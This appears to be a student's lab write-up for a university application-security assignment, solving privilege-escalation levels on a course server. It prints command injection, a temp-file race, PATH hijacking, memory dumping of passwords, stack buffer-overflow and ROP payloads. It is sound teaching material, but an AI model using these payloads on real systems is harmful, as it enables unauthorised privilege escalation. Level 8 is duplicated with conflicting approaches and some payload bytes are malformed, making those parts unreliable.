# Assignment 2

Solving each level as we go.
SSH into the client

```
ssh students24@appsec2026 -i students24.key -J s4508882@ssh.liacs.nl
```

# Level 1
Dictionary:
```
students24@appsec2026:/levels/level1$ ls
b.dict  level1  level1.c
```

Reading level1.c, we can see a `system()` call without any proper filtering of the input, therefore, we can simply execute a command by appending it to the word we are searching for

Malicious input:
`./level1 "xxxxx; /bin/sh"`

This opens a shell with level1 group access
Then execute `escalate`

# Level 2 
CD into level 2:
`cd /levels/level2`
Files:
```
dr-xr-x---  2 root level1  4096 Mar 17 09:48 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level2 16640 Mar 17 09:48 level2
-r--r-----  1 root level1  1337 Mar 17 09:48 level2.c
```

Executing level2 asks for input (potential buffer overflow/malicious input again)
reading level2.c
There is a buffer that is put into a `execl()` call. Looking at the docs for this
```
The exec() family of functions replaces the current process image
       with a new process image.  The functions described in this manual
       page are layered on top of execve(2).  (See the manual page for
       execve(2) for further details about the replacement of the current
       process image.)

       The initial argument for these functions is the name of a file
       that is to be executed.

       The functions can be grouped based on the letters following the
       "exec" prefix.


The const char *arg and subsequent ellipses can be thought of as
       arg0, arg1, ..., argn.  Together they describe a list of one or
       more pointers to null-terminated strings that represent the
       argument list available to the executed program.  The first
       argument, by convention, should point to the filename associated
       with the file being executed.  The list of arguments must be
       terminated by a null pointer, and, since these are variadic
       functions, this pointer must be cast (char *) NULL.

       By contrast with the 'l' functions, the 'v' functions (below)
       specify the command-line arguments of the executed program as a
       vector.
```
Therefore, it executes /bin/bash with the arguments:
`/bin/bash {file_loc} {user_input}`

so this executes our bash-script at file_loc with the user_input as an argument.
the temp file is stored as `/.runtime.sh`, we should be able to manipulate it whilst the program waits for input, and simply
change the code.

We run the program concurrently:
`./level2 &` then with a free shell, we manipulate the temp file
Full command:
```
./level2 & (sleep 1 & echo -e '#!/bin/bash\n/bin/bash -p -i' > ~/.runtime.sh & sleep 1)
```
This process has now been put into the background (can be found using `jobs`)
Call `fg` to return to the previous process, it should now have opened a (bash)ell.
Now execute `escalate` and your priveleges are fixed.

Permanently added students24 to group level2, congratulations!
/!\ Remember to log in again to reload your groups. /!\

# Level 3
Looking at the python code, there are no clear vulnerabilities. However, the system command that is run executes python3, what python3 executable this is, we do not know. So, we can determine that ourselves

## Step 1
Create a new python file
`mkdir /tmp/evilpython/`
## Step 2
Write a script 
`vim /tmp/evilpython/python3`
and write the following:
```
#!/bin/bash
./escalate
```
## Step 3: execute
Set the script to allow execution:
`chmod +x /tmp/evilpython/python3`
Then proceed to execute with new path variable
`PATH=/tmp/evilpython:$PATH ./level3`
Win (execute `escalate`).

# Level 4

Looking at the code, the generated password is stored on the stack (allocated within function call)
We can simply read the password off of the stack (there are 3 stack buffers @ 32, so we need to drop the next 96 bytes)

1. Open in `dbg ./level4`
2. Run until prompted
3. Exit to dbg (Cntrl C)
4. `backtrace` and look into the frame with the `main()` call
5. Dump rsp (stack ptr) `x/96c $rsp`
6. Read the dump (this iteration:)
```
0x7fffffffe210: 78 'N'  80 'P'  57 '9'  76 'L'  110 'n' 88 'X'  70 'F'  110 'n'
0x7fffffffe218: 67 'C'  70 'F'  107 'k' 110 'n' 48 '0'  69 'E'  87 'W'  72 'H'
0x7fffffffe220: 49 '1'  53 '5'  119 'w' 118 'v' 75 'K'  71 'G'  122 'z' 74 'J'
0x7fffffffe228: 103 'g' 107 'k' 50 '2'  90 'Z'  82 'R'  50 '2'  104 'h' 0 '\000'
```

so the password generated is `NP9LnXFnCFkn0EWH15wvKGzJgk2zR2h`

One problem: DBG ignores the bit flag. The address seems to be consistent for now (0x7fffffffe210 in multiple runs)
so we should just run it and attach gdb.
```
./level4 & PID=$!; sleep 0.1; dd if=/proc/$PID/mem bs=1 skip=$((0x7fffffffe210)) count=32 2>/dev/null; wait $PID
```

Okay, does not seem to work because of priveleges. Therefore, we need to predict.

Compile a predictor (by copying the code)
Run this command:
`PASS=$(/tmp/predictor) && (echo "a"; echo "$PASS"; sleep 0.2; echo "/bin/bash ./usr/local/bin/escalate")`

Win!

# Level 5 
There is a static file "password.h", we cannot access the file directly. Therefore we must dump it from memory.
Looking at the source code
```
#include <stdio.h>
#include <unistd.h>

#include "password.h"

int main(int argc, char* argv[]) {
    if(argc < 2)
        return 1;
    char* correct_pwd = get_password();
    int result = strcmp(correct_pwd, argv[1]);
    free(correct_pwd);
    if(result == 0) {
        printf("Authenticated\n");
        execl("/bin/sh", "/bin/sh", (char*)NULL);
    }
    else {
        printf("Wrong password\n");
    }
    return 0;
}
```
correct_pwd should store a pointer to the string with the correct password. It is free'd, therefore it should be heap allocated.
We will need to access the password before it is freed- therefore, we can set a breakpoint on strcmp, and look at which characters are being compared.

```
gdb) break strcmp
Breakpoint 2 at 0x7ffff7da7240: strcmp. (2 locations)
```

Executing until it hits the breakpoint:
```
(gdb) continue
Continuing.
Breakpoint 2.1, __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
warning: 108    ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S: No such file or directory
(gdb) frame
#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
108     in ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S
(gdb) backtrace
#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
#1  0x00005555555552ac in main ()
```
This should be the correct strcmp call. Therefore, we will take a look at the current call stack. The first argument to the function should be our target. The first argument is stored in `$rdi` register on x86-64, therefore we can simply dump the string at that address to retrieve the password
```
SuperVerySecretPassword
```
Then call escalate. Win

# Level 6
Looking at the source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void do_it()
{
  execl("/bin/bash", "/bin/bash", (char*)NULL);
}

int main(int argc, char **argv)
{
  char yo[128];

  // I am sure that this function will be useful one day.
  // For now I will just print its address, so that I don't lose it.
  printf("%p\n", &do_it);

  gets(yo);
  // Maybe I should also do something with this content?
  // Let's leave it for later, I am sure that I will finish this hobby project, 
  // unlike the other 10 that I have started this month.
```

They print the address of do_it, seems like we need to redirect the RIP to the do_it address
yo can only take in 128 characters, maybe we can overwrite the RIP?

Using input `4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141`

we get a segfault, this means we get a buffer overflow (memory corruption)

We should probably take a look at what the memory looks like
Dumping the assembly we get:
```
students24@appsec2026:/levels/level6$ objdump -d ./level6

./level6:     file format elf64-x86-64

........

0000000000001189 <do_it>:
    1189:       f3 0f 1e fa             endbr64
    118d:       55                      push   %rbp
    118e:       48 89 e5                mov    %rsp,%rbp
    1191:       ba 00 00 00 00          mov    $0x0,%edx
    1196:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    119d:       48 89 c6                mov    %rax,%rsi
    11a0:       48 8d 05 5d 0e 00 00    lea    0xe5d(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    11a7:       48 89 c7                mov    %rax,%rdi
    11aa:       b8 00 00 00 00          mov    $0x0,%eax
    11af:       e8 dc fe ff ff          call   1090 <execl@plt>
    11b4:       90                      nop
    11b5:       5d                      pop    %rbp
    11b6:       c3                      ret

00000000000011b7 <main>:
    11b7:       f3 0f 1e fa             endbr64
    11bb:       55                      push   %rbp                   <---- PUSH RBP ON STACK
    11bc:       48 89 e5                mov    %rsp,%rbp              <---- SAVE STACK PTR INTO RBP
    11bf:       48 81 ec 90 00 00 00    sub    $0x90,%rsp             <---- CLEAR ROOM FOR UTILIZATION
    11c6:       89 bd 7c ff ff ff       mov    %edi,-0x84(%rbp)
    11cc:       48 89 b5 70 ff ff ff    mov    %rsi,-0x90(%rbp)
    11d3:       48 8d 05 af ff ff ff    lea    -0x51(%rip),%rax        # 1189 <do_it>
    11da:       48 89 c6                mov    %rax,%rsi
    11dd:       48 8d 05 2a 0e 00 00    lea    0xe2a(%rip),%rax        # 200e <_IO_stdin_used+0xe>
    11e4:       48 89 c7                mov    %rax,%rdi
    11e7:       b8 00 00 00 00          mov    $0x0,%eax
    11ec:       e8 7f fe ff ff          call   1070 <printf@plt>
    11f1:       48 8d 45 80             lea    -0x80(%rbp),%rax      <----- LOAD BUFFER INPUT ONTO STACK 
    11f5:       48 89 c7                mov    %rax,%rdi
    11f8:       b8 00 00 00 00          mov    $0x0,%eax
                                                                     <----- Call will have saved the rip to the next instruction
    11fd:       e8 7e fe ff ff          call   1080 <gets@plt>
    1202:       b8 00 00 00 00          mov    $0x0,%eax
    1207:       c9                      leave
    1208:       c3                      ret
```

The buffer starts at rbp-0x80 (lea    -0x80(%rbp),%rax)

We can assume that our stack looks something like this:
```
┌─────────────────────┐  <- rsp / buffer start (rbp-0x80)
│   buffer (128 bytes)│
│                     │
├─────────────────────┤  <-  rbp
│  saved RBP (8 bytes)│
├─────────────────────┤  <- rbp+8
│  saved RIP (8 bytes)│  
└─────────────────────┘
```
Therefore we need to overwrite 136 bytes + address we want to access:
`perl -e 'print "A"x136 ."BBBBBBBB"' | ./level6`

We can execute using gdb to see what's happening
```
(gdb) run < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
Starting program: /levels/level6/level6 < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.
[Detaching after fork from child process 130195]
process 130192 is executing new program: /levels/level6/level6
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x555555555189

Program received signal SIGSEGV, Segmentation fault.
0x0000555555551189 in ?? ()
(gdb) info registers rip
rip            0x555555551189      0x555555551189
(gdb) 
``` Accidentally put in the wrong addy. Fixing it gives:

```Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x555555555189
process 130206 is executing new program: /usr/bin/bash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
process 130206 is executing new program: /usr/bin/bash.orig
warning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/libtinfo.so.6
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 130206) exited normally]
```

So we fixed our payload!
Executing normally (using cat to keep stdin open!):
```
(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"'; cat) | ./level6
```
We can now call escalate.

# Level 7
Root:
```
students24@appsec2026:/levels/level7$ ls -la
total 32
dr-xr-x---  2 root level6  4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level7 16328 Mar 17 09:49 level7
-r--r-----  1 root level6   907 Mar 17 09:48 level7.c
-r--r-----  1 root level7   395 Mar 17 09:48 special.h
```

```
students24@appsec2026:/levels/level7$ cat level7.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

#include "special.h"


int main(){
        int* myvalue = (int*) malloc(sizeof(int)); <--- allocate heap (store ptr in stack)

       8 + 8 + 8 + 8 + 8 + 16

        *myvalue = special_value();                <--- write value               
        int final = 0;

        printf("Can you please help me solve a difficult problem?\n");
        srand(time(NULL));
        int x = rand() % 10;
        int y = rand() % 10;
        printf("%d * %d = ?\n", x, y);
        int inputnumber = 0;
        scanf("%d", &inputnumber);
        if (inputnumber != x*y){
                printf("Maybe you should study Math instead of Security...\n");
                return 1;
        }


        printf("You are very good at maths!\nEnter your username: ");
        char name[16]; <--- also stored on stack
        scanf("%s", &name);
       

        if (final == *myvalue){ <---- look for JEQ instruction
                printf("You solved another problem today!\n");
                execl("/bin/sh", "/bin/sh", (char*)NULL);
        }

        else {
                printf("Congratulations to %s for being so good at maths! But you need to do a bit more for Security...\n", name);
        }

        return 0;
}
```

Looking at the ASM for main
```
00000000000012d8 <main>:
    12d8:       f3 0f 1e fa             endbr64
    12dc:       55                      push   %rbp
    12dd:       48 89 e5                mov    %rsp,%rbp
    12e0:       48 83 ec 30             sub    $0x30,%rsp
    12e4:       bf 04 00 00 00          mov    $0x4,%edi
    12e9:       e8 32 fe ff ff          call   1120 <malloc@plt>
    12ee:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    12f2:       b8 00 00 00 00          mov    $0x0,%eax
    12f7:       e8 4d ff ff ff          call   1249 <special_value>
    12fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
    1300:       89 02                   mov    %eax,(%rdx)
    1302:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%rbp)
    1309:       48 8d 05 f8 0c 00 00    lea    0xcf8(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    1310:       48 89 c7                mov    %rax,%rdi
    1313:       e8 b8 fd ff ff          call   10d0 <puts@plt>
    1318:       bf 00 00 00 00          mov    $0x0,%edi
    131d:       e8 ee fd ff ff          call   1110 <time@plt>
    1322:       89 c7                   mov    %eax,%edi
    1324:       e8 d7 fd ff ff          call   1100 <srand@plt>
    1329:       e8 22 fe ff ff          call   1150 <rand@plt>
    132e:       89 c2                   mov    %eax,%edx
    1330:       48 63 c2                movslq %edx,%rax
    1333:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
    133a:       48 c1 e8 20             shr    $0x20,%rax
    133e:       c1 f8 02                sar    $0x2,%eax
    1341:       89 d1                   mov    %edx,%ecx
    1343:       c1 f9 1f                sar    $0x1f,%ecx
    1346:       29 c8                   sub    %ecx,%eax
    1348:       89 45 f0                mov    %eax,-0x10(%rbp)
    134b:       8b 4d f0                mov    -0x10(%rbp),%ecx
    134e:       89 c8                   mov    %ecx,%eax
    1350:       c1 e0 02                shl    $0x2,%eax
    1353:       01 c8                   add    %ecx,%eax
    1355:       01 c0                   add    %eax,%eax
    1357:       29 c2                   sub    %eax,%edx
    1359:       89 55 f0                mov    %edx,-0x10(%rbp)
    135c:       e8 ef fd ff ff          call   1150 <rand@plt>
    1361:       89 c2                   mov    %eax,%edx
    1363:       48 63 c2                movslq %edx,%rax
    1366:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
    136d:       48 c1 e8 20             shr    $0x20,%rax
    1371:       c1 f8 02                sar    $0x2,%eax
    1374:       89 d1                   mov    %edx,%ecx
    1376:       c1 f9 1f                sar    $0x1f,%ecx
    1379:       29 c8                   sub    %ecx,%eax
    137b:       89 45 ec                mov    %eax,-0x14(%rbp)
    137e:       8b 4d ec                mov    -0x14(%rbp),%ecx
    1381:       89 c8                   mov    %ecx,%eax
    1383:       c1 e0 02                shl    $0x2,%eax
    1386:       01 c8                   add    %ecx,%eax
    1388:       01 c0                   add    %eax,%eax
    138a:       29 c2                   sub    %eax,%edx
    138c:       89 55 ec                mov    %edx,-0x14(%rbp)
    138f:       8b 55 ec                mov    -0x14(%rbp),%edx
    1392:       8b 45 f0                mov    -0x10(%rbp),%eax
    1395:       89 c6                   mov    %eax,%esi
    1397:       48 8d 05 9c 0c 00 00    lea    0xc9c(%rip),%rax        # 203a <_IO_stdin_used+0x3a>
    139e:       48 89 c7                mov    %rax,%rdi
    13a1:       b8 00 00 00 00          mov    $0x0,%eax
    13a6:       e8 45 fd ff ff          call   10f0 <printf@plt>
    13ab:       c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%rbp)
    13b2:       48 8d 45 e8             lea    -0x18(%rbp),%rax
    13b6:       48 89 c6                mov    %rax,%rsi
    13b9:       48 8d 05 87 0c 00 00    lea    0xc87(%rip),%rax        # 2047 <_IO_stdin_used+0x47>
    13c0:       48 89 c7                mov    %rax,%rdi
    13c3:       b8 00 00 00 00          mov    $0x0,%eax
    13c8:       e8 63 fd ff ff          call   1130 <__isoc99_scanf@plt>
    13cd:       8b 45 f0                mov    -0x10(%rbp),%eax
    13d0:       0f af 45 ec             imul   -0x14(%rbp),%eax
    13d4:       89 c2                   mov    %eax,%edx
    13d6:       8b 45 e8                mov    -0x18(%rbp),%eax
    13d9:       39 c2                   cmp    %eax,%edx

------------------------------------------------------------------------------------
                                   JE instruction to compare myvalue with input EDX is myvalue (local var)
                                   so we need a way to make sure that the value referenced on the heap is zero
    13db:       74 19                   je     13f6 <main+0x11e>
    13dd:       48 8d 05 6c 0c 00 00    lea    0xc6c(%rip),%rax        # 2050 <_IO_stdin_used+0x50>
    13e4:       48 89 c7                mov    %rax,%rdi
    13e7:       e8 e4 fc ff ff          call   10d0 <puts@plt>
    13ec:       b8 01 00 00 00          mov    $0x1,%eax
    13f1:       e9 8e 00 00 00          jmp    1484 <main+0x1ac>
    13f6:       48 8d 05 8b 0c 00 00    lea    0xc8b(%rip),%rax        # 2088 <_IO_stdin_used+0x88>
    13fd:       48 89 c7                mov    %rax,%rdi
    1400:       b8 00 00 00 00          mov    $0x0,%eax
    1405:       e8 e6 fc ff ff          call   10f0 <printf@plt>
    140a:       48 8d 45 d0             lea    -0x30(%rbp),%rax
    140e:       48 89 c6                mov    %rax,%rsi
    1411:       48 8d 05 a2 0c 00 00    lea    0xca2(%rip),%rax        # 20ba <_IO_stdin_used+0xba>
    1418:       48 89 c7                mov    %rax,%rdi
    141b:       b8 00 00 00 00          mov    $0x0,%eax
    1420:       e8 0b fd ff ff          call   1130 <__isoc99_scanf@plt>
    1425:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    1429:       8b 00                   mov    (%rax),%eax
    142b:       39 45 f4                cmp    %eax,-0xc(%rbp)
    142e:       75 34                   jne    1464 <main+0x18c>
    1430:       48 8d 05 89 0c 00 00    lea    0xc89(%rip),%rax        # 20c0 <_IO_stdin_used+0xc0>
    1437:       48 89 c7                mov    %rax,%rdi
    143a:       e8 91 fc ff ff          call   10d0 <puts@plt>
    143f:       ba 00 00 00 00          mov    $0x0,%edx
    1444:       48 8d 05 97 0c 00 00    lea    0xc97(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
    144b:       48 89 c6                mov    %rax,%rsi
    144e:       48 8d 05 8d 0c 00 00    lea    0xc8d(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
    1455:       48 89 c7                mov    %rax,%rdi
    1458:       b8 00 00 00 00          mov    $0x0,%eax
    145d:       e8 de fc ff ff          call   1140 <execl@plt>
    1462:       eb 1b                   jmp    147f <main+0x1a7>
    1464:       48 8d 45 d0             lea    -0x30(%rbp),%rax
    1468:       48 89 c6                mov    %rax,%rsi
    146b:       48 8d 05 7e 0c 00 00    lea    0xc7e(%rip),%rax        # 20f0 <_IO_stdin_used+0xf0>
    1472:       48 89 c7                mov    %rax,%rdi
    1475:       b8 00 00 00 00          mov    $0x0,%eax
    147a:       e8 71 fc ff ff          call   10f0 <printf@plt>
    147f:       b8 00 00 00 00          mov    $0x0,%eax
    1484:       c9                      leave
    1485:       c3                      ret
```

Looking at the ASM and the source code at execution time our stack will look similar to this:
```
┌─────────────────────────────┐  <--- rsp
│                             │  rbp-0x38 │
│        char name[16]        │           │ 16 bytes
│                             │  rbp-0x30 │
├─────────────────────────────┤
│      int input number       │  rbp-0x28 │ 4 bytes
├─────────────────────────────┤
│           int x             │  rbp-0x20 │ 4 bytes
├─────────────────────────────┤
│           int y             │  rbp-0x18 │ 4 bytes
├─────────────────────────────┤
│         int final           │  rbp-0x10 │ 4 bytes
├─────────────────────────────┤
│    ptr to special value     │  rbp-0x8  │ 8 bytes
├─────────────────────────────┤
│         saved RBP           │  rbp      │ 8 bytes
├─────────────────────────────┤
│         saved RIP           │  rbp+0x8  │ 8 bytes
└─────────────────────────────┘
```

Debugging further, we can set a breakpoint during our comparison call
```
   0x000055555555542b <+339>:   cmp    DWORD PTR [rbp-0xc],eax
   0x000055555555542e <+342>:   jne    0x555555555464 <main+396> <--- break here
```
can check what values are being compared (eax to be assumed the special value, edx the test value)

Reading the frame info
```
rax            0x2c41              11329
rbx            0x7fffffffe358      140737488347992
rcx            0x0                 0
rdx            0x0                 0
rsi            0xa                 10
rdi            0x7fffffffdcc0      140737488346304
rbp            0x7fffffffe230      0x7fffffffe230
rsp            0x7fffffffe200      0x7fffffffe200
r8             0xa                 10
r9             0xffffffff          4294967295
r10            0xffffffffffffff88  -120
r11            0x7ffff7e038e0      140737352055008
r12            0x1                 1
r13            0x0                 0
r14            0x555555557d80      93824992247168
r15            0x7ffff7ffd000      140737354125312
rip            0x55555555542e      0x55555555542e <main+342>
eflags         0x293               [ CF AF SF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7fb2740      140737353819968
```

Our test value is at rbp-0xc, therefore we need to overwrite 36 bytes before overwriting the last two bytes for the special value
which we can simply read by dumping it from memory using gdb (stored in RAX)
bp:
`0x000055555555542e`
`perl -e '"A"x36 . "\x41\x2c"'`

payload:
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,`
result:
```
Permanently added students24 to group level7, congratulations!
/!\ Remember to log in again to reload your groups. /!\
```
PS: I wrote down an integer is 8 bytes- obviously it is 4.

# Level 8 
Root
```
students24@appsec2026:/levels/level8$ ls -la
total 28
dr-xr-x---  2 root level7  4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level8 16056 Mar 17 09:49 level8
-r--r-----  1 root level7   502 Mar 17 09:48 level8.c
```

Source:
```
students24@appsec2026:/levels/level8$ cat level8.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char *argv[]){
        char username[100];
        printf("What is your name?\n");
        scanf("%s", username);

        printf("Welcome, %s!\n", username);
        printf("What do you want to do?\n1)Solve this exercise\n2)Get access to a shell\n");
        int choice;
        scanf("%d", &choice);
        if (choice == 1)
                printf("Well get on with it then!\n");
        else if (choice == 2)
                printf("That would be too easy...\n");
        else
                printf("Good luck!\n");

        return 0;
}
```

Looking at the source code, this time around, there doesn't seem to be any form of execution or external libraries going on. Therefore, my first intuition would be to use some ROP-type attack affecting the RIP to execute a shell. We see stdlib.h is included, therefore system() should be linked(?)

Opening in gdb
```
(gdb) p system
$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
```

`0x7ffff7c58750` is the address of the system() call.

We are on x86-x64 therefore argument sadly are not stored on the stack, we need a gadget. Furthermore, calling `strings` for /bin/sh

```
students24@appsec2026:/levels/level8$ strings ./level8 | grep /bin/sh
....
``` we can see there are no /bin/sh strings in our binary. Therefore, we need to append this to our payload as well.

Our payload is going to look something like this:
[buffer] <- 100 characters  ('A')
[EBP] <--- address to /bin/sh      (begin of buffer)
[RIP] <--- address to gadget       pop rdi, ret

Buffer begin address: `0x0x7fffffffe1c0`
We need the gadget address, therefore we search (this in libc):
```
(gdb) find /b 0x7ffff7c28000,0x7ffff7db0000, 0x5f, 0xc3
0x7ffff7d0f78b <__spawnix+875>
0x7ffff7d10dc9 <parse_qtd_backslash+153>
0x7ffff7d10fe7 <exec_comm+151>
0x7ffff7d11cbe <parse_backtick+398>
0x7ffff7d12559 <parse_dollars+265>
0x7ffff7d14a19 <parse_arith+489>
0x7ffff7d157cc <wordexp+2636>
7 patterns found.
(gdb) x/2i 0x7ffff7d0f78b
   0x7ffff7d0f78b <__spawnix+875>:      pop    rdi
   0x7ffff7d0f78c <__spawnix+876>:      ret
(gdb) 
```

Our payload is going to look like this:
[filler 108 bytes][pop rdi, ret gadget][binsh address (in buffer)][system_address]

(A x 108)(0x7ffff7d0f78b)(0x7fffffffe1c0 + xxxx)(0x7ffff7c58750)

/bin/sh address: 0x7fffffffe1c0 + 108 + 8 + 8 + 8 = 0x7fffffffe244
Lets generate with perl again
```
perl -e 'print "A"x108 . "\x8b\xf7\xd0\xf7\xff\x7f\x00\x00" . "\xe2\xff\xff\xff\x7f\x00\x00" . "\x87\xc5\xf7\xff\x7f\x00\x00'" . "/bin/sh/"'
```


# Level 8 
Root
```
students24@appsec2026:/levels/level8$ ls -la
total 28
dr-xr-x---  2 root level7  4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level8 16056 Mar 17 09:49 level8
-r--r-----  1 root level7   502 Mar 17 09:48 level8.c
```

Source:
```
students24@appsec2026:/levels/level8$ cat level8.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char *argv[]){
        char username[100];
        printf("What is your name?\n");
        scanf("%s", username);

        printf("Welcome, %s!\n", username);
        printf("What do you want to do?\n1)Solve this exercise\n2)Get access to a shell\n");
        int choice;
        scanf("%d", &choice);
        if (choice == 1)
                printf("Well get on with it then!\n");
        else if (choice == 2)
                printf("That would be too easy...\n");
        else
                printf("Good luck!\n");

        return 0;
}
```

Looking at the source code, this time around, there doesn't seem to be any form of execution or external libraries going on. Therefore, my first intuition would be to simply inject shellcode to run system('/bin/sh escalate')

Opening in gdb
```
(gdb) p system
$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
``

`0x7ffff7c58750` is the address of the system() call.

We to avoid having a zero string in there, we simply push the payload string byte by byte and allocate it dynamically. After that, we execute the system call and it works!

Then fill the rest up until the return address (0x90) NOP INSTRUCTIONS until the return address.

# Level 9

```
students24@appsec2026:/levels/level9$ ls -la
total 28
dr-xr-x---  2 root level8  4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level9 16128 Mar 17 09:49 level9
-r--r-----  1 root level8   898 Mar 17 09:48 level9.c
students24@appsec2026:/levels/level9$ cat level9.c
#include <stdio.h>

#define BUFFER_SIZE (32)

void read_input(int* buffer, unsigned short size) {
    printf("Please enter %d numbers\n", (int)size);
    for(unsigned short i = 0 ; i < size; ++i) {
        scanf("%d", &buffer[i]);
    }
}

int calc_magic_number(int* buffer, unsigned short num_numbers) {
    int result = 0;
    for(unsigned short i = 0; i < num_numbers; ++i)
        result ^= buffer[i];
    return result;
}

int main() {
    int buffer[BUFFER_SIZE];
    int num_numbers =  0;

    printf("Welcome to the magic number calculator\nHow many lucky numbers do you have? ");
    scanf("%d", &num_numbers);
    
    if(num_numbers >= BUFFER_SIZE) {
        printf("Too many numbers\n");
        return 1;
    }
    
    read_input(buffer, num_numbers);
    int magic_no = calc_magic_number(buffer, num_numbers);
    
    printf("Your magic number is: %d\n", magic_no);
    return 0;
}
```

The assembly:
```
000000000000124b <main>:
    124b:       f3 0f 1e fa             endbr64
    124f:       55                      push   %rbp
    1250:       48 89 e5                mov    %rsp,%rbp
    1253:       48 81 ec a0 00 00 00    sub    $0xa0,%rsp
    125a:       c7 85 6c ff ff ff 00    movl   $0x0,-0x94(%rbp)
    1261:       00 00 00 
    1264:       48 8d 05 bd 0d 00 00    lea    0xdbd(%rip),%rax        # 2028 <_IO_stdin_used+0x28>
    126b:       48 89 c7                mov    %rax,%rdi
    126e:       b8 00 00 00 00          mov    $0x0,%eax
    1273:       e8 08 fe ff ff          call   1080 <printf@plt>
    1278:       48 8d 85 6c ff ff ff    lea    -0x94(%rbp),%rax
    127f:       48 89 c6                mov    %rax,%rsi
    1282:       48 8d 05 98 0d 00 00    lea    0xd98(%rip),%rax        # 2021 <_IO_stdin_used+0x21>
    1289:       48 89 c7                mov    %rax,%rdi
    128c:       b8 00 00 00 00          mov    $0x0,%eax
    1291:       e8 fa fd ff ff          call   1090 <__isoc99_scanf@plt>
    1296:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
    129c:       83 f8 1f                cmp    $0x1f,%eax
    129f:       7e 16                   jle    12b7 <main+0x6c>
    12a1:       48 8d 05 cc 0d 00 00    lea    0xdcc(%rip),%rax        # 2074 <_IO_stdin_used+0x74>
    12a8:       48 89 c7                mov    %rax,%rdi
    12ab:       e8 c0 fd ff ff          call   1070 <puts@plt>
    12b0:       b8 01 00 00 00          mov    $0x1,%eax
    12b5:       eb 55                   jmp    130c <main+0xc1>
    12b7:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
    12bd:       0f b7 d0                movzwl %ax,%edx
    12c0:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
    12c7:       89 d6                   mov    %edx,%esi
    12c9:       48 89 c7                mov    %rax,%rdi
    12cc:       e8 b8 fe ff ff          call   1189 <read_input>
    12d1:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
    12d7:       0f b7 d0                movzwl %ax,%edx
    12da:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
    12e1:       89 d6                   mov    %edx,%esi
    12e3:       48 89 c7                mov    %rax,%rdi
    12e6:       e8 13 ff ff ff          call   11fe <calc_magic_number>
    12eb:       89 45 fc                mov    %eax,-0x4(%rbp)
    12ee:       8b 45 fc                mov    -0x4(%rbp),%eax
    12f1:       89 c6                   mov    %eax,%esi
    12f3:       48 8d 05 8b 0d 00 00    lea    0xd8b(%rip),%rax        # 2085 <_IO_stdin_used+0x85>
    12fa:       48 89 c7                mov    %rax,%rdi
    12fd:       b8 00 00 00 00          mov    $0x0,%eax
    1302:       e8 79 fd ff ff          call   1080 <printf@plt>
    1307:       b8 00 00 00 00          mov    $0x0,%eax
    130c:       c9                      leave
    130d:       c3                      ret
```


First off all, running the program we are prompted by entering our N of numbers. After which we can deposit n numbers which are promtply stored within the buffer.
The max size is 32, so to make this program vulnerable, we need to be able to write more than 32 integers, how we will write the payload is a problem for later, but to be able to achieve this, we need to be able to bypass
```
if(num_numbers >= BUFFER_SIZE) ...
```

Whatever number we input as num_numbers, will be passed to this function:
```
void read_input(int* buffer, unsigned short size)
```

